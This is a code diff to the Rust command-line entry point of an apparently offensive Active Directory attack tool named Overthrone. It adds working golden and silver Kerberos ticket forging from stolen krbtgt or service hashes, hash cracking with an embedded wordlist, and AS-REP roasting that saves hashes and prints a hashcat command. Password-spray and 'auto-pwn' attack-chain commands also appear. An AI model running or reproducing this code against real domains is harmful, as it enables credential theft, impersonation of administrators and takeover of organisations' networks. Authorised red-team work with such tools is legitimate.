@@ -90,10 +90,9 @@ enum Commands {
         #[command(flatten)]
         args: commands::wizard::WizardArgs,
     },
-    /// Full AD enumeration via reaper modules (alias: enum)
-    #[command(alias = "enum")]
+    /// Full AD enumeration via reaper modules
     Reaper {
-        #[arg(long, env = "OT_DC_IP")]
+        #[arg(long, env = "OT_DC_IP", alias = "dc")]
         dc_ip: Option<String>,
         #[arg(long, short, value_delimiter = ',')]
         modules: Vec<String>,
@@ -109,8 +108,8 @@ enum Commands {
         #[arg(long, default_value = "false")]
         include_disabled: bool,
     },
-    /// Kerberos operations (alias: krb)
-    #[command(alias = "krb")]
+    /// Kerberos operations (aliases: krb, roast)
+    #[command(alias = "krb", alias = "roast")]
     Kerberos {
         #[command(subcommand)]
         action: KerberosAction,
@@ -138,15 +137,15 @@ enum Commands {
     Spray {
         #[arg(short, long)]
         password: String,
-        #[arg(short, long)]
+        #[arg(short = 'U', long, alias = "users")]
         userlist: String,
         #[arg(long, default_value = "1")]
         delay: u64,
         #[arg(long, default_value = "0")]
         jitter: u64,
     },
-    /// Autonomous attack chain (alias: auto)
-    #[command(name = "auto-pwn", alias = "auto")]
+    /// Autonomous attack chain (aliases: auto, autopwn)
+    #[command(name = "auto-pwn", alias = "auto", alias = "autopwn")]
     AutoPwn {
         #[arg(short, long, default_value = "Domain Admins")]
         target: String,
@@ -174,6 +173,106 @@ enum Commands {
         #[arg(long, short)]
         dc: Option<String>,
     },
+    /// Generate engagement report (Markdown, PDF, JSON)
+    Report {
+        /// Input engagement state file
+        #[arg(long, default_value = "engagement.json")]
+        input: String,
+        /// Output report file
+        #[arg(short, long, default_value = "report.md")]
+        output: String,
+        /// Report format
+        #[arg(short = 'F', long, value_enum, default_value = "markdown")]
+        format: ReportFormat,
+    },
+    /// Ticket forging operations (golden, silver tickets)
+    Forge {
+        #[command(subcommand)]
+        action: ForgeAction,
+    },
+    /// Crack captured hashes (AS-REP, Kerberoast, NTLM)
+    Crack {
+        /// Hash string to crack (auto-detects type)
+        #[arg(short = 's', long)]
+        hash: Option<String>,
+        
+        /// File containing hashes (one per line)
+        #[arg(short, long)]
+        file: Option<String>,
+        
+        /// Cracking mode: fast, default, thorough
+        #[arg(short = 'M', long, value_enum, default_value = "default")]
+        mode: CrackMode,
+        
+        /// Custom wordlist file
+        #[arg(short = 'W', long)]
+        wordlist: Option<String>,
+        
+        /// Maximum candidates to try (0 = unlimited)
+        #[arg(long, default_value = "0")]
+        max_candidates: usize,
+    },
+}
+
+/// Cracking mode configuration
+#[derive(Debug, Clone, clap::ValueEnum)]
+enum CrackMode {
+    /// Fast mode - minimal rules, quick cracking
+    Fast,
+    /// Default mode - balanced rules and speed
+    Default,
+    /// Thorough mode - all rules, exhaustive search
+    Thorough,
+}
+
+#[derive(Clone, clap::ValueEnum)]
+enum ReportFormat {
+    Markdown,
+    Pdf,
+    Json,
+}
+
+#[derive(Subcommand)]
+enum ForgeAction {
+    /// Forge a Golden Ticket (TGT) using krbtgt hash
+    Golden {
+        /// Domain SID (e.g., S-1-5-21-...)
+        #[arg(long)]
+        domain_sid: String,
+        /// User to impersonate (default: Administrator)
+        #[arg(long, default_value = "Administrator")]
+        user: String,
+        /// User RID (default: 500 for Administrator)
+        #[arg(long, default_value = "500")]
+        rid: u32,
+        /// krbtgt NT hash (32 hex chars)
+        #[arg(long)]
+        krbtgt_hash: String,
+        /// Output file for the ticket
+        #[arg(short, long, default_value = "golden.kirbi")]
+        output: String,
+    },
+    /// Forge a Silver Ticket (TGS) using service account hash
+    Silver {
+        /// Domain SID
+        #[arg(long)]
+        domain_sid: String,
+        /// User to impersonate
+        #[arg(long, default_value = "Administrator")]
+        user: String,
+        /// User RID
+        #[arg(long, default_value = "500")]
+        rid: u32,
+        /// Target SPN (e.g., cifs/dc01.corp.local)
+        #[arg(long)]
+        spn: String,
+        /// Service account NT hash
+        #[arg(long)]
+        service_hash: String,
+        /// Output file for the ticket
+        #[arg(short, long, default_value = "silver.kirbi")]
+        output: String,
+    },
 }
 
 #[derive(Clone, clap::ValueEnum)]
@@ -195,7 +294,11 @@ enum KerberosAction {
         #[arg(long)]
         spn: Option<String>,
     },
-    AsrepRoast,
+    AsrepRoast {
+        /// File with usernames to roast (one per line)
+        #[arg(short = 'U', long)]
+        userlist: Option<String>,
+    },
     GetTgt,
     GetTgs {
         #[arg(long)]
@@ -252,6 +355,9 @@ enum GraphAction {
     Export {
         #[arg(short, long, default_value = "graph.json")]
         output: String,
+        /// Export in BloodHound-compatible format
+        #[arg(short = 'B', long)]
+        bloodhound: bool,
     },
 }
 
@@ -327,6 +433,11 @@ async fn main() {
         } => cmd_autopwn(&cli, target, method.clone(), *stealth, *dry_run).await,
         Commands::Dump { target, source } => cmd_dump(&cli, target, source.clone()).await,
         Commands::Doctor { checks, dc } => cmd_doctor(&cli, checks.clone(), dc.as_deref()).await,
+        Commands::Report { input, output, format } => cmd_report(&cli, input, output, format.clone()).await,
+        Commands::Forge { action } => cmd_forge(&cli, action).await,
+        Commands::Crack { hash, file, mode, wordlist, max_candidates } => {
+            cmd_crack(&cli, hash.as_deref(), file.as_deref(), mode.clone(), wordlist.as_deref(), *max_candidates).await
+        }
     };
 
     std::process::exit(exit_code);
@@ -493,59 +604,99 @@ async fn cmd_kerberos(cli: &Cli, action: &KerberosAction) -> i32 {
                 }
             }
         }
-        KerberosAction::AsrepRoast => {
+        KerberosAction::AsrepRoast { userlist } => {
             banner::print_module_banner("AS-REP ROAST");
-            // Step 1: Enumerate users with DONT_REQ_PREAUTH via reaper
-            let config =
-                match make_reaper_config(cli, &creds, dc.clone(), vec!["users".to_string()], 500) {
-                    Ok(c) => c,
-                    Err(e) => return e,
-                };
-            let reaper_result = match overthrone_reaper::runner::run_reaper(&config).await {
-                Ok(r) => r,
-                Err(e) => {
-                    banner::print_fail(&format!("Enumeration failed: {e}"));
-                    return 1;
+            
+            // Determine which users to roast
+            let users_to_roast: Vec<String> = if let Some(list_path) = userlist {
+                // Load users from file
+                match std::fs::read_to_string(list_path) {
+                    Ok(content) => content
+                        .lines()
+                        .map(|l| l.trim().to_string())
+                        .filter(|l| !l.is_empty() && !l.starts_with('#'))
+                        .collect(),
+                    Err(e) => {
+                        banner::print_fail_detail(
+                            "Failed to read userlist file",
+                            &e.to_string(),
+                            "Check file path and permissions"
+                        );
+                        return 1;
+                    }
                 }
+            } else {
+                // Enumerate users with DONT_REQ_PREAUTH via reaper
+                let config =
+                    match make_reaper_config(cli, &creds, dc.clone(), vec!["users".to_string()], 500) {
+                        Ok(c) => c,
+                        Err(e) => return e,
+                    };
+                let reaper_result = match overthrone_reaper::runner::run_reaper(&config).await {
+                    Ok(r) => r,
+                    Err(e) => {
+                        banner::print_fail_detail(
+                            "Enumeration failed",
+                            &e.to_string(),
+                            "Check DC connectivity and credentials"
+                        );
+                        return 1;
+                    }
+                };
+                // Filter AS-REP roastable users
+                reaper_result
+                    .users
+                    .iter()
+                    .filter(|u| u.dont_require_preauth && u.enabled)
+                    .map(|u| u.sam_account_name.clone())
+                    .collect()
             };
-            // Filter AS-REP roastable users
-            let asrep_users: Vec<_> = reaper_result
-                .users
-                .iter()
-                .filter(|u| u.dont_require_preauth && u.enabled)
-                .collect();
-            if asrep_users.is_empty() {
+            
+            if users_to_roast.is_empty() {
                 banner::print_warn("No AS-REP roastable users found");
                 return 0;
             }
+            
             println!(
-                "  {} {} AS-REP roastable users found",
+                "  {} Roasting {} users",
                 "▸".bright_black(),
-                asrep_users.len().to_string().cyan()
+                users_to_roast.len().to_string().cyan()
             );
+            
             let domain = creds.domain.clone();
             let mut hash_count = 0;
-            for user in &asrep_users {
-                match kerberos::asrep_roast(&dc, &domain, &user.sam_account_name).await {
+            let mut hashes: Vec<String> = Vec::new();
+            
+            for user in &users_to_roast {
+                match kerberos::asrep_roast(&dc, &domain, user).await {
                     Ok(hash) => {
-                        println!(
-                            "  {} {}: {}",
-                            "✓".green(),
-                            user.sam_account_name.bold(),
-                            hash
-                        );
+                        banner::print_hash_capture("AS-REP", user, &hash.hash_string.chars().take(32).collect::<String>());
+                        hashes.push(format!("$krb5asrep${}@{}:{}", user, domain, hash.hash_string));
                         hash_count += 1;
                     }
                     Err(e) => {
-                        println!("  {} {}: {}", "✗".red(), user.sam_account_name, e);
+                        println!("  {} {}: {}", "✗".red(), user, e);
                     }
                 }
             }
+            
+            // Save hashes to file
+            if !hashes.is_empty() {
+                let filename = "asrep_hashes.txt";
+                let content = hashes.join("\n");
+                if let Err(e) = std::fs::write(filename, &content) {
+                    banner::print_fail(&format!("Failed to save hashes: {e}"));
+                } else {
+                    banner::print_success(&format!("Saved {} hashes to {}", hash_count, filename));
+                    println!("  {} Crack with: hashcat -m 18200 {} wordlist.txt", "→".yellow(), filename);
+                }
+            }
+            
             println!(
                 "\n  {} {}/{} hashes extracted",
                 "▸".bright_black(),
                 hash_count.to_string().green(),
-                asrep_users.len()
+                users_to_roast.len()
             );
             0
         }
@@ -648,6 +799,48 @@ async fn cmd_kerberos(cli: &Cli, action: &KerberosAction) -> i32 {
             }
         }
     }
+}
+// ═══════════════════════════════════════════════════════
+
+/// Convert Overthrone graph format to BloodHound-compatible JSON format.
+fn convert_to_bloodhound_format(graph_data: &serde_json::Value) -> String {
+    let mut bh_nodes: Vec<serde_json::Value> = Vec::new();
+    let mut bh_edges: Vec<serde_json::Value> = Vec::new();
+
+    if let Some(nodes) = graph_data["nodes"].as_array() {
+        for node in nodes {
+            let bh_node = serde_json::json!({
+                "name": node["name"].as_str().unwrap_or("unknown"),
+                "type": node["type"].as_str().unwrap_or("Base"),
+                "objectid": node["id"].as_str().unwrap_or(""),
+                "enabled": node["enabled"].as_bool().unwrap_or(true),
+                "domain": node["domain"].as_str().unwrap_or(""),
+                "highvalue": node["high_value"].as_bool().unwrap_or(false),
+                "owned": false,
+            });
+            bh_nodes.push(bh_node);
+        }
+    }
+
+    if let Some(edges) = graph_data["edges"].as_array() {
+        for edge in edges {
+            let edge_type = edge["type"].as_str().unwrap_or("Unknown");
+            let bh_edge = serde_json::json!({
+                "source": edge["source"].as_str().unwrap_or(""),
+                "target": edge["target"].as_str().unwrap_or(""),
+                "type": edge_type,
+            });
+            bh_edges.push(bh_edge);
+        }
+    }
+
+    let bloodhound_json = serde_json::json!({
+        "meta": { "type": "bloodhound", "version": 4, "generator": "overthrone" },
+        "nodes": bh_nodes,
+        "edges": bh_edges,
+    });
+
+    serde_json::to_string_pretty(&bloodhound_json).unwrap_or_else(|_| graph_data.to_string())
 }
 
 // ═══════════════════════════════════════════════════════
@@ -1063,18 +1256,35 @@ async fn cmd_graph(cli: &Cli, action: &GraphAction) -> i32 {
             }
             0
         }
-        GraphAction::Export { output } => {
+        GraphAction::Export { output, bloodhound } => {
             // Copy graph file to specified output
             match std::fs::read_to_string(graph_file) {
                 Ok(json) => {
-                    if let Err(e) = std::fs::write(output, &json) {
+                    // If bloodhound format requested, convert
+                    let export_json = if *bloodhound {
+                        // Parse the Overthrone graph and convert to BloodHound format
+                        match serde_json::from_str::<serde_json::Value>(&json) {
+                            Ok(graph_data) => {
+                                convert_to_bloodhound_format(&graph_data)
+                            }
+                            Err(_) => {
+                                banner::print_warn("Failed to parse graph for BloodHound conversion, using raw JSON");
+                                json.clone()
+                            }
+                        }
+                    } else {
+                        json.clone()
+                    };
+                    if let Err(e) = std::fs::write(output, &export_json) {
                         banner::print_fail(&format!("Failed to export: {e}"));
                         return 1;
                     }
+                    let format_label = if *bloodhound { "BloodHound" } else { "Overthrone" };
                     banner::print_success(&format!(
-                        "Graph exported to {} ({} bytes)",
+                        "Graph exported ({} format) to {} ({} bytes)",
+                        format_label,
                         output,
-                        json.len()
+                        export_json.len()
                     ));
                     0
                 }
@@ -1458,4 +1668,263 @@ async fn cmd_doctor(_cli: &Cli, checks: Vec<String>, dc: Option<&str>) -> i32 {
     // Run general environment checks
     let check_filter = if checks.is_empty() { None } else { Some(checks) };
     commands::doctor::run(check_filter).await
+}
+
+// ═══════════════════════════════════════════════════════
+// cmd_report
+// ═══════════════════════════════════════════════════════
+
+async fn cmd_report(_cli: &Cli, input: &str, output: &str, format: ReportFormat) -> i32 {
+    banner::print_module_banner("REPORT");
+    
+    let input_path = std::path::Path::new(input);
+    let output_dir = std::path::Path::new(output)
+        .parent()
+        .unwrap_or(std::path::Path::new("."))
+        .to_path_buf();
+    
+    let format_str = match format {
+        ReportFormat::Markdown => "Markdown",
+        ReportFormat::Pdf => "PDF",
+        ReportFormat::Json => "JSON",
+    };
+    
+    println!(
+        "  {} Generating {} report from {}",
+        "▸".bright_black(),
+        format_str.cyan(),
+        input
+    );
+    
+    // Build report config
+    let scribe_format = match format {
+        ReportFormat::Markdown => overthrone_scribe::ReportFormat::Markdown,
+        ReportFormat::Pdf => overthrone_scribe::ReportFormat::Pdf,
+        ReportFormat::Json => overthrone_scribe::ReportFormat::Json,
+    };
+    
+    let config = overthrone_scribe::ReportConfig::default()
+        .format(scribe_format)
+        .output_dir(output_dir);
+    
+    match overthrone_scribe::generate_from_file(input_path, &config).await {
+        Ok(report_output) => {
+            for file in &report_output.files {
+                banner::print_success(&format!("Report saved to {}", file.display()));
+            }
+            0
+        }
+        Err(e) => {
+            banner::print_fail(&format!("Report generation failed: {e}"));
+            1
+        }
+    }
+}
+
+// ═══════════════════════════════════════════════════════
+// cmd_crack
+// ═══════════════════════════════════════════════════════
+
+async fn cmd_crack(
+    _cli: &Cli,
+    hash: Option<&str>,
+    file: Option<&str>,
+    mode: CrackMode,
+    wordlist: Option<&str>,
+    max_candidates: usize,
+) -> i32 {
+    banner::print_module_banner("CRACK");
+
+    // Build cracker config based on mode
+    let mut config = match mode {
+        CrackMode::Fast => overthrone_core::crypto::CrackerConfig::fast(),
+        CrackMode::Default => overthrone_core::crypto::CrackerConfig::default(),
+        CrackMode::Thorough => overthrone_core::crypto::CrackerConfig::thorough(),
+    };
+    
+    // Apply custom wordlist if provided
+    if let Some(wl_path) = wordlist {
+        config.custom_wordlist = Some(wl_path.to_string());
+        config.use_embedded = false;
+    }
+    
+    // Apply max candidates
+    if max_candidates > 0 {
+        config.max_candidates = max_candidates;
+    }
+    
+    // Collect hashes to crack
+    let hashes: Vec<String> = if let Some(h) = hash {
+        vec![h.to_string()]
+    } else if let Some(f) = file {
+        match std::fs::read_to_string(f) {
+            Ok(content) => content
+                .lines()
+                .map(|l| l.trim().to_string())
+                .filter(|l| !l.is_empty() && !l.starts_with('#'))
+                .collect(),
+            Err(e) => {
+                banner::print_fail(&format!("Failed to read hash file '{}': {e}", f));
+                return 1;
+            }
+        }
+    } else {
+        banner::print_fail("Either --hash or --file must be provided");
+        return 1;
+    };
+    
+    if hashes.is_empty() {
+        banner::print_warn("No hashes to crack");
+        return 0;
+    }
+    
+    println!(
+        "  {} Cracking {} hash(es) in {:?} mode",
+        "▸".bright_black(),
+        hashes.len().to_string().cyan(),
+        mode
+    );
+    
+    if wordlist.is_some() {
+        println!(
+            "  {} Using custom wordlist: {}",
+            "▸".bright_black(),
+            wordlist.unwrap().yellow()
+        );
+    } else {
+        println!(
+            "  {} Using embedded wordlist (top 10K passwords)",
+            "▸".bright_black()
+        );
+    }
+    
+    println!(
+        "  {} Rules applied: {}",
+        "▸".bright_black(),
+        config.rules.len()
+    );
+    println!();
+    
+    // Perform cracking
+    let report = match overthrone_hunter::crack_hashes(&hashes, &config) {
+        Ok(r) => r,
+        Err(e) => {
+            banner::print_fail(&format!("Cracking failed: {e}"));
+            return 1;
+        }
+    };
+    
+    // Display results
+    report.print_summary();
+    
+    // Save cracked credentials if any
+    if !report.cracked.is_empty() {
+        let cracked_file = "cracked_credentials.txt";
+        let content = report.to_cracked_file();
+        if let Err(e) = std::fs::write(cracked_file, &content) {
+            banner::print_fail(&format!("Failed to save cracked credentials: {e}"));
+        } else {
+            banner::print_success(&format!(
+                "Cracked credentials saved to {}",
+                cracked_file
+            ));
+        }
+    }
+    
+    if report.cracked.is_empty() { 1 } else { 0 }
+}
+
+// ═══════════════════════════════════════════════════════
+// cmd_forge
+// ═══════════════════════════════════════════════════════
+
+async fn cmd_forge(cli: &Cli, action: &ForgeAction) -> i32 {
+    banner::print_module_banner("FORGE");
+    
+    let domain = cli.domain.as_deref().unwrap_or_else(|| {
+        banner::print_fail("--domain is required for ticket forging");
+        std::process::exit(1)
+    });
+    
+    match action {
+        ForgeAction::Golden { domain_sid, user, rid, krbtgt_hash, output } => {
+            println!(
+                "  {} Forging Golden Ticket for {}@{}",
+                "▸".bright_black(),
+                user.cyan(),
+                domain.to_uppercase().cyan()
+            );
+            println!("  {} Domain SID: {}", "▸".bright_black(), domain_sid.yellow());
+            println!("  {} User RID: {}", "▸".bright_black(), rid);
+            
+            // Parse krbtgt hash
+            let key = match hex::decode(krbtgt_hash.trim()) {
+                Ok(k) => k,
+                Err(e) => {
+                    banner::print_fail(&format!("Invalid krbtgt hash: {e}"));
+                    return 1;
+                }
+            };
+            
+            match kerberos::forge_tgt(domain, domain_sid, user, *rid, &key, kerberos::ETYPE_RC4_HMAC) {
+                Ok(tgt) => {
+                    use kerberos_asn1::Asn1Object;
+                    let ticket_bytes = tgt.ticket.build();
+                    if let Err(e) = std::fs::write(output, &ticket_bytes) {
+                        banner::print_fail(&format!("Failed to write ticket: {e}"));
+                        return 1;
+                    }
+                    banner::print_success(&format!(
+                        "Golden Ticket saved to {} ({} bytes)",
+                        output,
+                        ticket_bytes.len()
+                    ));
+                    0
+                }
+                Err(e) => {
+                    banner::print_fail(&format!("Failed to forge ticket: {e}"));
+                    1
+                }
+            }
+        }
+        ForgeAction::Silver { domain_sid, user, rid, spn, service_hash, output } => {
+            println!(
+                "  {} Forging Silver Ticket for {} → {}",
+                "▸".bright_black(),
+                user.cyan(),
+                spn.yellow()
+            );
+            println!("  {} Domain SID: {}", "▸".bright_black(), domain_sid.yellow());
+            
+            // Parse service hash
+            let key = match hex::decode(service_hash.trim()) {
+                Ok(k) => k,
+                Err(e) => {
+                    banner::print_fail(&format!("Invalid service hash: {e}"));
+                    return 1;
+                }
+            };
+            
+            match kerberos::forge_service_ticket(domain, domain_sid, user, *rid, spn, &key, kerberos::ETYPE_RC4_HMAC) {
+                Ok(tgt) => {
+                    use kerberos_asn1::Asn1Object;
+                    let ticket_bytes = tgt.ticket.build();
+                    if let Err(e) = std::fs::write(output, &ticket_bytes) {
+                        banner::print_fail(&format!("Failed to write ticket: {e}"));
+                        return 1;
+                    }
+                    banner::print_success(&format!(
+                        "Silver Ticket saved to {} ({} bytes)",
+                        output,
+                        ticket_bytes.len()
+                    ));
+                    0
+                }
+                Err(e) => {
+                    banner::print_fail(&format!("Failed to forge ticket: {e}"));
+                    1
+                }
+            }
+        }
+    }
 }
